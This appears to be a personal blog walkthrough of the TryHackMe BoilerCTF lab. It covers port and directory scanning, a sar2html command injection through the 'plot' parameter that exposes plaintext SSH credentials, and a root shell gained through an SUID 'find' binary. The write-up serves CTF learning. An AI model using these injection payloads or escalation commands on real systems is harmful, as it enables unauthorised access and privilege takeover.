---
layout: post
title: BoilerCTF Walkthrough
categories: [TryHackMe]
tags: [Command Injection, CMS, Enumeration, Sar2HTML]
---

# BoilerCTF walkthrough
Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here [Tryhackme](https://www.tryhackme.com/room/boilerctf2), I'll walk you through buddy!

## ~$ Hints
- Recursive numeration
- Don't bother Bruteforcing... You're overthinking it.
- 2HTML
- ExploitDB

## ~$ Scanning & Enumeration::
  As always:
```
┌──(azazel㉿azazel)-[~]
└─$ sudo nmap -sV -sC -sS 10.10.47.112 -vv -p- -T4                                                              130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 21:14 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
Initiating Ping Scan at 21:14
Scanning 10.10.47.112 [4 ports]
Completed Ping Scan at 21:14, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:14
Completed Parallel DNS resolution of 1 host. at 21:14, 0.28s elapsed
Initiating SYN Stealth Scan at 21:14
Scanning 10.10.47.112 [65535 ports]
Discovered open port 80/tcp on 10.10.47.112
Discovered open port 21/tcp on 10.10.47.112
Increasing send delay for 10.10.47.112 from 0 to 5 due to 874 out of 2184 dropped probes since last increase.
Increasing send delay for 10.10.47.112 from 5 to 10 due to 11 out of 23 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.69% done; ETC: 21:25 (0:10:30 remaining)
SYN Stealth Scan Timing: About 16.23% done; ETC: 21:33 (0:15:19 remaining)
SYN Stealth Scan Timing: About 17.14% done; ETC: 21:35 (0:16:46 remaining)
Warning: 10.10.47.112 giving up on port because retransmission cap hit (6).
Discovered open port 55007/tcp on 10.10.47.112
SYN Stealth Scan Timing: About 40.07% done; ETC: 21:39 (0:14:50 remaining)
SYN Stealth Scan Timing: About 46.19% done; ETC: 21:40 (0:13:36 remaining)
SYN Stealth Scan Timing: About 75.36% done; ETC: 21:38 (0:05:52 remaining)
SYN Stealth Scan Timing: About 80.18% done; ETC: 21:38 (0:04:40 remaining)
Discovered open port 10000/tcp on 10.10.47.112
SYN Stealth Scan Timing: About 85.05% done; ETC: 21:38 (0:03:29 remaining)
SYN Stealth Scan Timing: About 90.04% done; ETC: 21:38 (0:02:18 remaining)
SYN Stealth Scan Timing: About 95.08% done; ETC: 21:37 (0:01:08 remaining)
Completed SYN Stealth Scan at 21:38, 1406.17s elapsed (65535 total ports)
Initiating Service scan at 21:38
Scanning 4 services on 10.10.47.112
Completed Service scan at 21:38, 6.57s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.47.112.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:38
NSE: [ftp-bounce 10.10.47.112:21] PORT response: 500 Illegal PORT command.
Completed NSE at 21:39, 30.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 1.89s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.01s elapsed
Nmap scan report for 10.10.47.112
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2022-04-19 21:14:58 WAT for 1445s
Not shown: 65406 closed tcp ports (reset), 125 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.45.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 37A72E58B1456207D2E4673B3F824AAF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1446.21 seconds
           Raw packets sent: 79609 (3.503MB) | Rcvd: 88232 (6.783MB)

```
From our scans we have Ftp, http, ssh(on a rather uncommon port) and Webmin to work with.

We got anon logins from ftp, so I hit the server
  ![image](/assets/img/posts/BoilerCTF/boiler-ftp.png)

A "full"(ls -la) directory listing gave me the .info.txt which was well...pretty useless: 
```
┌──(azazel㉿azazel)-[~/Tryhackme/BoilerCTF]
└─$ cat info.txt            
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
Contained a ROT13 encoded text which translated into a humble reminder from [Seth](https://www.tryhackme.com/p/MrSeth6797), on enumreration as the key...
  ![image](/assets/img/posts/BoilerCTF/decode.png)
  
How very thoughtful:) Moving on, I decide to check out our buddy on port 80!
We're greeted with the default Apache landing page, on checking the source I find no suspiscious content, say less::
  ![image](/assets/img/posts/BoilerCTF/dir-enum.png)
  
Robots.txt tells gives us this info:
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
At this point I realized this was going to be a frustrating room, the sequence of numerics at the end seemed like a decimal encoding but on translating it didn't mean anything of importance...
Let's visit the "Joomla" directory, it is apparently a CMS with a crazy tonne of exploits, at this point I ran a recursive directory bruteforce to find a login page, so maybe I could gain admin access and try to spawn a shell::
```
┌──(azazel㉿azazel)-[~]
└─$ dirsearch -u http://10.10.47.112/  -w /usr/share/wordlists/dirb/common.txt -t 10 -r

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 4613

Output File: /home/azazel/.dirsearch/reports/10.10.47.112/-_22-04-19_21-29-55.txt

Error Log: /home/azazel/.dirsearch/logs/errors-22-04-19_21-29-55.log

Target: http://10.10.47.112/

[21:29:56] Starting: 
[21:31:09] 200 -   11KB - /index.html
[21:31:14] 301 -  313B  - /joomla  ->  http://10.10.47.112/joomla/     (Added to queue)
[21:31:23] 301 -  313B  - /manual  ->  http://10.10.47.112/manual/     (Added to queue)
[21:31:54] 200 -  257B  - /robots.txt
[21:31:59] 403 -  300B  - /server-status
[21:32:33] Starting: joomla/
[21:32:37] 301 -  322B  - /joomla/_archive  ->  http://10.10.47.112/joomla/_archive/     (Added to queue)
[21:32:37] 301 -  323B  - /joomla/_database  ->  http://10.10.47.112/joomla/_database/     (Added to queue)
[21:32:37] 301 -  320B  - /joomla/_files  ->  http://10.10.47.112/joomla/_files/     (Added to queue)
[21:32:39] 301 -  319B  - /joomla/_test  ->  http://10.10.47.112/joomla/_test/     (Added to queue)     
[21:32:40] 301 -  318B  - /joomla/~www  ->  http://10.10.47.112/joomla/~www/     (Added to queue)
[21:32:45] 301 -  327B  - /joomla/administrator  ->  http://10.10.47.112/joomla/administrator/     (Added to queue)
[21:32:55] 301 -  317B  - /joomla/bin  ->  http://10.10.47.112/joomla/bin/     (Added to queue)
[21:32:57] 301 -  319B  - /joomla/build  ->  http://10.10.47.112/joomla/build/     (Added to queue)
[21:32:58] 301 -  319B  - /joomla/cache  ->  http://10.10.47.112/joomla/cache/     (Added to queue)
[21:33:06] 301 -  324B  - /joomla/components  ->  http://10.10.47.112/joomla/components/     (Added to queue)
[21:33:39] 301 -  320B  - /joomla/images  ->  http://10.10.47.112/joomla/images/     (Added to queue)
[21:33:40] 301 -  322B  - /joomla/includes  ->  http://10.10.47.112/joomla/includes/     (Added to queue)
[21:33:41] 200 -   12KB - /joomla/index.php
[21:33:42] 301 -  326B  - /joomla/installation  ->  http://10.10.47.112/joomla/installation/     (Added to queue)
[21:33:47] 301 -  322B  - /joomla/language  ->  http://10.10.47.112/joomla/language/     (Added to queue)
[21:33:47] 301 -  321B  - /joomla/layouts  ->  http://10.10.47.112/joomla/layouts/     (Added to queue)
[21:33:48] 301 -  323B  - /joomla/libraries  ->  http://10.10.47.112/joomla/libraries/     (Added to queue)
[21:33:55] 301 -  319B  - /joomla/media  ->  http://10.10.47.112/joomla/media/     (Added to queue)
[21:33:58] 301 -  321B  - /joomla/modules  ->  http://10.10.47.112/joomla/modules/     (Added to queue)
[21:34:12] 301 -  321B  - /joomla/plugins  ->  http://10.10.47.112/joomla/plugins/     (Added to queue)
[21:34:44] 301 -  323B  - /joomla/templates  ->  http://10.10.47.112/joomla/templates/     (Added to queue)
[21:34:45] 301 -  319B  - /joomla/tests  ->  http://10.10.47.112/joomla/tests/     (Added to queue)
[21:34:46] 301 -  317B  - /joomla/tmp  ->  http://10.10.47.112/joomla/tmp/     (Added to queue)
[21:35:05] Starting: manual/
[21:35:45] 301 -  316B  - /manual/da  ->  http://10.10.47.112/manual/da/     (Added to queue)
[21:35:46] 301 -  316B  - /manual/de  ->  http://10.10.47.112/manual/de/     (Added to queue)
[21:35:54] 301 -  316B  - /manual/en  ->  http://10.10.47.112/manual/en/     (Added to queue)
[21:35:56] 301 -  316B  - /manual/es  ->  http://10.10.47.112/manual/es/     (Added to queue)
[21:36:04] 301 -  316B  - /manual/fr  ->  http://10.10.47.112/manual/fr/     (Added to queue)
[21:36:14] 301 -  320B  - /manual/images  ->  http://10.10.47.112/manual/images/     (Added to queue)
[21:36:15] 200 -  626B  - /manual/index.html
[21:36:19] 301 -  316B  - /manual/ja  ->  http://10.10.47.112/manual/ja/     (Added to queue)
[21:36:22] 301 -  316B  - /manual/ko  ->  http://10.10.47.112/manual/ko/     (Added to queue)
[21:37:18] 301 -  319B  - /manual/style  ->  http://10.10.47.112/manual/style/     (Added to queue)
[21:37:27] 301 -  316B  - /manual/tr  ->  http://10.10.47.112/manual/tr/     (Added to queue)
[21:37:44] 301 -  319B  - /manual/zh-cn  ->  http://10.10.47.112/manual/zh-cn/     (Added to queue)
[21:37:44] Starting: joomla/_archive/
[21:38:57] 200 -  162B  - /joomla/_archive/index.html
[21:40:35] Starting: joomla/_database/
[21:41:52] 200 -  160B  - /joomla/_database/index.html
[21:43:30] Starting: joomla/_files/
[21:44:50] 200 -  168B  - /joomla/_files/index.html
[21:46:35] Starting: joomla/_test/
[21:47:53] 200 -    5KB - /joomla/_test/index.php  
[21:49:42] Starting: joomla/~www/
[21:51:03] 200 -  162B  - /joomla/~www/index.html
[21:52:41] Starting: joomla/administrator/
[21:53:15] 301 -  333B  - /joomla/administrator/cache  ->  http://10.10.47.112/joomla/administrator/cache/     (Added to queue)
[21:53:23] 301 -  338B  - /joomla/administrator/components  ->  http://10.10.47.112/joomla/administrator/components/     (Added to queue)
[21:53:56] 301 -  332B  - /joomla/administrator/help  ->  http://10.10.47.112/joomla/administrator/help/ 
[21:54:01] 200 -    5KB - /joomla/administrator/index.php
[21:54:14] 301 -  332B  - /joomla/administrator/logs  ->  http://10.10.47.112/joomla/administrator/logs/     (Added to queue)
[21:54:21] 301 -  335B  - /joomla/administrator/modules  ->  http://10.10.47.112/joomla/administrator/modules/     (Added to queue)
[21:55:18] 301 -  337B  - /joomla/administrator/templates  ->  http://10.10.47.112/joomla/administrator/templates/     (Added to queue)
CTRL+C detected: Pausing threads, please wait...
```
Sheesh, alot of sub directories uhn?
  

First thing I checked was this
 ```->  http://10.10.47.112/joomla/administrator/ ```

Which led to a login page, a bruteforce attempt isnt so wise here cause I found a csrf token in the source code(I read up on this and apparently it would hinder an exhaustive search since it expires on first login attempt)

I decided to swiftly visit all the other subdirs to find anything we could leverage to maybe spawn a shell or get ssh keys somehow...
 ![image](/assets/img/posts/BoilerCTF/dead-end.png)  ![image](/assets/img/posts/BoilerCTF/dead-end2.png)  ![image](/assets/img/posts/BoilerCTF/code3.png)

One of the few encoded texts translated to this ::
  ![image](/assets/img/posts/BoilerCTF/decrypt3.png)

This machine was taunting me at this point.

# ~$ Exploitation
To cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found 

``/joomla/_test  ->  http://10.10.47.112/joomla/_test/ ``

We find a sar2html page out of curiousity::
_Basically a sar2html is an opensource project that converts sar binary data to graphical html_

My interest specifically was in exploiting this... on checking exploitdb, an RCE exploit exists for vulnerable version 3.2.1::
  ![image](/assets/img/posts/BoilerCTF/exploit.png)

From this exploit:
```
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```
It looks like once we replace the post argument in the query string in the url with a command of our choice, it executes on the system, like a passive command injection!(passive because the results of the executed commands are not directly outputted onto the screen but still executes in the background by the system) Awesome!

To test our exploit::

  ![image](/assets/img/posts/BoilerCTF/exploit-use.png)

To reveal the result of our query-inserted command, just click on the "Select Host" option and the drop down will reveal the results of the query which was passed as a system command!
It also appears to have a weird log.txt document in the current directory when you execute "ls -la" by inserting it like so

```
http://<ipaddr>/index.php?plot=;ls -la
```
Just cat log.txt, and click select host to display the command output.::       
```
http://<ipaddr>/index.php?plot=; cat log.txt
```
  ![image](/assets/img/posts/BoilerCTF/ssh-creds.png)

It looks like the log file contains ssh creds of a user "Basterd" and his pass all in plaintext. Hehee


## ~$ Initial Access & Priviledge escalation::
#### _Hackers don't break in, we log in_::
  ![image](/assets/img/posts/BoilerCTF/initial-access.png)

In "his" home directory seems there is some sort of backup script that belongs to another use who has a little more priviledges by virtue of SUID bit set for him on the find binary, cat the file and we have his creds, horizontal privesc with with his creds and then navigate to his home directory, the .secret file contains the first flag and then to privesc we have SUID bit set on find
```
find / -type f -perm -4000 2>/dev/null 
 OR 
find / -type f -perm -u=s 2>dev/null
```

[gtfobin](https://gtfobins.github.io/gtfobins/find/#suid) says we could use the misconfigured binary by running 
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```
And spawn a priviledged shell and read our root flag, like so::
  ![image](/assets/img/posts/BoilerCTF/end.jpg)

Rooted!!

Salam, from [Rami3l](https://www.tryhackme.com/p/Rami3l).
